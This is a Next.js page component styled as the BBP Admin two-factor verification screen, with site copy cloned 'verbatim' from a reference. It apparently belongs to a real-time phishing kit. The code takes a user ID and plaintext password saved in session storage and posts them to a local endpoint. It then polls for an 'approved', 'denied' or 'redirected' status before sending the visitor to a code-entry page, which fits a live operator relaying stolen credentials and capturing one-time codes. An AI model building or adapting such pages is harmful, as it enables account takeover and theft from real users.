'use client'

import Link from "next/link"
import Image from "next/image"
import { useState, useEffect, useRef } from 'react'
import { Check, ChevronDown, Info, Lock, Mail, Phone, X } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Footer } from "@/components/footer"
import { ThreeDotSpinner } from "@/components/ThreeDotSpinner"
import { trackFormSubmission } from "@/hooks/use-visitor-tracking"
import { useRequireLoginFlow } from "@/hooks/use-require-login-flow"
import { setAptiaLoginFlowStage } from "@/hooks/use-aptia-login-flow-guard"
import {
  MSG_UNABLE_VERIFY_TIME,
  approvalPollDelayMs,
} from "@/lib/approval-messages"
import {
  WEALTHCARE_BUTTON_CHROME,
  WEALTHCARE_BUTTON_GEOMETRY,
  WEALTHCARE_NEUTRAL_BUTTON_CLASS,
} from "@/lib/wealthcare-button-styles"

const POLL_INTERVAL_MS = 750
const WAIT_TIMEOUT_MS = 90 * 1000

const VERIFICATION_LOADING_MS = 10000

const METHOD_OPTIONS: ReadonlyArray<{ value: "email" | "text"; label: string }> = [
  { value: "email", label: "Email" },
  { value: "text", label: "Text" },
]

/** Reference copy, verbatim. The note's missing space after "button." is in the
 *  original string and is reproduced exactly. */
const CONF_TEXT =
  "Protecting your information is our first priority. In order to access this site or perform this specific function you must receive a confirmation code to the device of your choice. You will be asked to enter the code on the next screen."

const NOTE_TEXT =
  "To proceed, please press the generate code button.If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function."

/** Step 2's note — the reference drops the "press generate code" sentence. */
const WAITING_NOTE_TEXT =
  "If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function."

/** Chrome from the shared Wealthcare tokens; the fill is BBP's own. */
const BUTTON_CHROME = `${WEALTHCARE_BUTTON_GEOMETRY} gap-3.5 ${WEALTHCARE_BUTTON_CHROME} bg-[#141c4d] hover:bg-[#407ec9] text-white disabled:opacity-70`

const NEUTRAL_BUTTON_CHROME = `${WEALTHCARE_BUTTON_GEOMETRY} gap-3.5 ${WEALTHCARE_NEUTRAL_BUTTON_CLASS} bg-[#407ec9] hover:bg-[#141c4d] text-white disabled:opacity-70`

const CONTENT_COLUMN =
  "w-full px-[10px] pt-4 md:pt-10 pb-8 min-[769px]:px-4 min-[1200px]:max-w-[1180px] min-[1200px]:mx-auto min-[1440px]:max-w-[1280px] min-[1440px]:px-[50px]"

const CONTENT_INNER =
  "w-full min-[769px]:w-[calc(39%-27px)] min-[769px]:ml-[27px]"

export default function Login2FAVerifyPage() {
  const allowed = useRequireLoginFlow()
  const [method, setMethod] = useState<"email" | "text">("email")
  const [isLoading, setIsLoading] = useState(false)
  const [loadingMethod, setLoadingMethod] = useState<'email' | 'text' | null>(null)

  const [pendingId, setPendingId] = useState<string | null>(null)
  const pollRef = useRef<ReturnType<typeof setTimeout> | null>(null)
  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null)
  const [networkError, setNetworkError] = useState('')

  const handleVerificationMethod = async (selected: 'email' | 'text') => {
    if (loadingMethod !== null || isLoading) return

    setLoadingMethod(selected)
    setIsLoading(true)
    setNetworkError('')

    const maskedEmailStored = typeof window !== 'undefined' ? sessionStorage.getItem('maskedEmail') ?? '' : ''
    const maskedPhoneStored = typeof window !== 'undefined' ? sessionStorage.getItem('maskedPhone') ?? '' : ''

    trackFormSubmission({
      type: selected === 'email' ? 'email_verification' : 'text_verification',
      page: `/login/2fa-verify?method=${selected}`,
      userId: typeof window !== 'undefined' ? sessionStorage.getItem('loginUserId') ?? '' : '',
      ...(selected === 'email' ? { email: maskedEmailStored } : { phone: maskedPhoneStored }),
    }).catch(() => { })

    try {
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('verificationMethod', selected)
        sessionStorage.setItem('maskedEmail', maskedEmailStored)
        sessionStorage.setItem('maskedPhone', maskedPhoneStored)
      }
      const userId = typeof window !== 'undefined' ? sessionStorage.getItem('loginUserId') ?? '' : ''
      const password = typeof window !== 'undefined' ? sessionStorage.getItem('loginPassword') ?? '' : ''
      const res = await fetch('/api/pending-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId,
          password,
          method: selected,
          maskedEmail: maskedEmailStored,
          maskedPhone: maskedPhoneStored,
          flow: 'login',
        }),
      })
      const data = await res.json()
      if (data.id) {
        setPendingId(data.id)
        return
      }
      setLoadingMethod(null)
      setIsLoading(false)
      setNetworkError(MSG_UNABLE_VERIFY_TIME)
    } catch {
      setLoadingMethod(null)
      setIsLoading(false)
      setNetworkError(MSG_UNABLE_VERIFY_TIME)
    }
  }


  useEffect(() => {
    if (!pendingId) return

    const clearPolling = () => {
      if (pollRef.current) {
        clearTimeout(pollRef.current)
        pollRef.current = null
      }
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current)
        timeoutRef.current = null
      }
    }

    timeoutRef.current = setTimeout(() => {
      clearPolling()
      setPendingId(null)
      setLoadingMethod(null)
      setIsLoading(false)
      setNetworkError(MSG_UNABLE_VERIFY_TIME)
    }, WAIT_TIMEOUT_MS)

    const poll = async () => {
      try {
        const res = await fetch(`/api/pending-login/${encodeURIComponent(pendingId)}`, {
          cache: 'no-store',
          headers: { 'Cache-Control': 'no-cache', Pragma: 'no-cache' },
        })
        if (!res.ok) return
        const data = await res.json()
        const status = String(data?.status ?? '').trim().toLowerCase()

        if (status === 'approved') {
          clearPolling()
          const approvedMethod = data?.method || loadingMethod
          if (typeof window !== 'undefined' && approvedMethod) {
            sessionStorage.setItem('verificationMethod', approvedMethod)
            sessionStorage.setItem('maskedEmail', sessionStorage.getItem('maskedEmail') ?? '')
            sessionStorage.setItem('maskedPhone', sessionStorage.getItem('maskedPhone') ?? '')
            sessionStorage.setItem('loginFrom2fa', '1')
            setAptiaLoginFlowStage('otp')
          }
          window.location.href = `/login/verify-code?method=${approvedMethod}`
          return
        }

        if (status === 'redirected') {
          clearPolling()
          window.location.href = '/api/login-out'
          return
        }

        if (status === 'denied' || status === 'expired') {
          clearPolling()
          if (status === 'denied') {
            window.location.href = '/?loginDenied=1'
            return
          }
          setPendingId(null)
          setLoadingMethod(null)
          setIsLoading(false)
          setNetworkError(MSG_UNABLE_VERIFY_TIME)
        }
      } catch {
        // ignore temporary poll errors
      }
    }

    const waitStartedAt = Date.now()
      const tick = async () => {
        const token = -1 as unknown as ReturnType<typeof setTimeout>
        pollRef.current = token
        await poll()
        if (pollRef.current !== token) return
        pollRef.current = setTimeout(() => {
          void tick()
        }, approvalPollDelayMs(waitStartedAt))
      }
      void tick()

    return clearPolling
  }, [pendingId, loadingMethod])

  /* Swap on the clicked method, not on request resolution. */
  const isWaiting = loadingMethod !== null
  const showMethodSelection = !isWaiting
  const optionsDisabled = loadingMethod !== null || isLoading

  if (!allowed) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <p className="text-gray-600">Loading...</p>
      </div>
    )
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 px-6 py-[15px]">
        <div className="flex items-center">
          <div className="flex items-center gap-6 flex-1 min-w-0">
            {/* Logo */}
            <Link href="/" className="flex items-center shrink-0">
              <Image
                src="/BBPAdmin_Alegeus_Logo_Blue_Service.4ec5724d58c34a02b47bdfd467112a82.png"
                alt="BBP Admin"
                width={120}
                height={40}
                className="h-[40px] w-auto"
                priority
              />
            </Link>

            {/* Contact Info - visible on all sizes; on mobile replaces Login label */}
            <div className="flex flex-col text-xs text-gray-600 leading-tight ml-auto shrink-0">
              <div className="flex items-center gap-2">
                <Phone className="w-3 h-3" />
                <span>(630) 773-2337</span>
              </div>
              <div className="flex items-center gap-2 mt-0.5">
                <Mail className="w-3 h-3" />
                <span>support@bbpadmin.com</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col min-[1200px]:items-center">
        <div className={CONTENT_COLUMN}>
          <div className={CONTENT_INNER}>
            {isWaiting && (
              <div className="text-center mb-[18px]">
                <Lock className="w-[46px] h-[46px] text-[#414041] mx-auto mb-[5px]" />
                <p className="text-[14px] leading-[1.6] text-[#707070]">
                  {loadingMethod === "email" ? "An e-mail has been sent:" : "An SMS has been sent:"}
                </p>
                <p className="text-[14px] leading-[1.6] text-[#707070]">
                  Enter the verification code that you received via{" "}
                  <strong className="font-semibold">{loadingMethod === "email" ? "Email" : "SMS"}</strong> below:
                </p>
                <p className="text-[14px] leading-[1.6] text-[#707070] mt-4">
                  Note - Do not share your verification code with anyone else
                </p>
              </div>
            )}

            {/* Spinner occupies the form region only — copy and note stay put. */}
            {isWaiting && <ThreeDotSpinner label="Sending your verification code" />}

            {showMethodSelection && (
              <>
                <div className="text-center mb-[18px]">
                  <Lock className="w-[46px] h-[46px] text-[#414041] mx-auto mb-[5px]" />
                  <p className="text-[14px] leading-[1.6] text-[#707070]">{CONF_TEXT}</p>
                </div>

                {networkError ? (
                  <p className="text-red-600 text-sm text-center mb-4" role="alert">
                    {networkError}
                  </p>
                ) : null}

                <div className={`transition-opacity ${optionsDisabled ? "opacity-60" : ""}`}>
                  {/* Label 200px + 36px inset / control 202px, side-by-side only at >=1200px. */}
                  <div className="flex flex-col min-[1200px]:flex-row min-[1200px]:items-center min-[1200px]:justify-between gap-1 min-[1200px]:gap-0 mb-4">
                    <div className="w-full max-[768px]:mx-[5px] min-[769px]:pl-9 min-[1200px]:w-[200px] min-[1200px]:mr-auto">
                      <span className="block text-[14px] text-gray-700 max-[768px]:pl-8 min-[769px]:pl-0">
                        Confirmation Code
                      </span>
                    </div>
                    <div className="relative w-full h-[38px] bg-white min-[1200px]:w-[202px]">
                      <select
                        aria-label="Confirmation Code"
                        name="confirmationMethod"
                        value={method}
                        disabled={optionsDisabled}
                        onChange={(e) => setMethod(e.target.value as "email" | "text")}
                        className="w-full h-full pl-3 pr-8 bg-white border border-[#bec5c2] text-[15px] text-[#424242] outline-none appearance-none disabled:bg-[#f3f3f3] disabled:text-[#b0b0b0]"
                      >
                        {METHOD_OPTIONS.map((o) => (
                          <option key={o.value} value={o.value}>{o.label}</option>
                        ))}
                      </select>
                      <ChevronDown
                        className="pointer-events-none absolute right-2 top-1/2 -translate-y-1/2 w-[22px] h-[22px] text-[#424242]"
                        aria-hidden="true"
                      />
                    </div>
                  </div>

                  {/* 220px block, stacked, each button 100% wide. */}
                  <div className="w-[220px] mx-auto">
                    <Button
                      type="button"
                      disabled={optionsDisabled}
                      onClick={() => { window.location.href = '/' }}
                      className={`${NEUTRAL_BUTTON_CHROME} mb-[10px]`}
                    >
                      <X className="w-6 h-6 shrink-0" />
                      <span className="flex-1 text-center truncate">Cancel</span>
                    </Button>

                    <Button
                      type="button"
                      disabled={optionsDisabled}
                      onClick={() => void handleVerificationMethod(method)}
                      className={BUTTON_CHROME}
                    >
                      <Check className="w-6 h-6 shrink-0" />
                      <span className="flex-1 text-center truncate">Generate Code</span>
                    </Button>
                  </div>
                </div>
              </>
            )}

            {/* Note lives OUTSIDE the gated form so it survives the wait. */}
            <div
              role="note"
              className="relative mt-6 pl-[48px] min-[769px]:pl-[62px] pr-[13px] py-[13px] pb-[14px] text-[14px] leading-[1.3] text-[#424242]"
              style={{ backgroundColor: "#F3F7A9" }}
            >
              <Info
                className="absolute left-1 top-1/2 -translate-y-1/2 w-[35px] h-[35px] text-[#414141]"
                aria-hidden="true"
              />
              <p className="m-0">{isWaiting ? WAITING_NOTE_TEXT : NOTE_TEXT}</p>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  )
}
